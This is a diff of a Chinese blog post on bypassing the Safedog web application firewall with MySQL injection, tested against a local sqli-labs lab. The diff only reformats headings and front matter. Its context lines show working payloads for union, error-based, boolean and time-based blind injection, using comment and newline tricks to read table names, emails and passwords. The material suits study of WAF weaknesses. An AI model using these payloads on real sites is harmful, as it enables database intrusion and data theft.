@@ -1,18 +1,16 @@
 ---
 title: "Bypass MySQL Safedog"
 date: 2019-10-10T21:58:09+08:00
-lastmod: 2019-10-10T21:58:09+08:00
 draft: false
 tags: []
 categories: ['bypass']
-comment: true
 ---
 
 日狗
 
 <!--more-->
 
-# 判断注入
+## 判断注入
 
 安全狗不让基本运算符后跟数字字符串
 
@@ -57,7 +55,7 @@ http://172.16.1.157/sql/Less-1/?id=1' and CONCAT(1)-- +		正常
 http://172.16.1.157/sql/Less-1/?id=1' and CONCAT(0)-- +		不正常
 ```
 
-# 判断字段数
+## 判断字段数
 
 绕order by
 
@@ -73,7 +71,7 @@ http://172.16.1.157/sql/Less-1/?id=1'/*!14440order by*/ 3 -- +
 http://172.16.1.157/sql/Less-1/?id=1'order%23%0aby 3 -- +
 ```
 
-# 联合查询
+## 联合查询
 
 关键在于打乱`union select`
 
@@ -156,7 +154,7 @@ http://172.16.1.157/sql/Less-1/?id=-1' union %23a%0aSELECT 1,2,(select email_id 
 
 > 在下文中不再提及开启information_schema防护的绕过姿势，自行举一反三。
 
-# 报错注入
+## 报错注入
 
 报错注入只提及updatexml报错
 
@@ -200,11 +198,11 @@ http://172.16.1.157/sql/Less-1/?id=-1' and updatexml(1,`concat`(0x7e,(select col
 http://172.16.1.157/sql/Less-1/?id=-1' and updatexml(1,concat(0x7e,(select email_id from %23a%0a emails limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- +
 ```
 
-# 盲注
+## 盲注
 
 分布尔盲注和时间盲注来说吧
 
-## 布尔盲注
+### 布尔盲注
 
 不让他匹配完整括号对
 
@@ -230,7 +228,7 @@ http://172.16.1.157/sql/Less-1/?id=1' and hex(SUBSTR((select table_name from %23
 
 列名字段名同理，略
 
-## 时间盲注
+### 时间盲注
 
 不匹配成对括号
 
@@ -253,7 +251,7 @@ http://172.16.1.157/sql/Less-1/?id=1'  and if%23%0a(left(user(/*!)*/,1/*!)*/=0x7
 http://172.16.1.157/sql/Less-1/?id=1'  and if%23%0a(left((select group_concat(table_name/*!)*/ from%23a%0ainformation_schema.tables where table_schema=database(/*!)*/ /*!)*/,1/*!)*/=0x65,sleep(5/*!)*/,1/*!)*/ -- +
 ```
 
-# 其他
+## 其他
 
 length()长度
 
@@ -268,7 +266,7 @@ count()
 http://172.16.1.157/sql/Less-1/?id=1'  and  (%23a%0aselect count(password/*!)*/ from %23a%0a users/*!)*/<=>13 -- +
 ```
 
-# 参考
+## 参考
 
 https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI
 
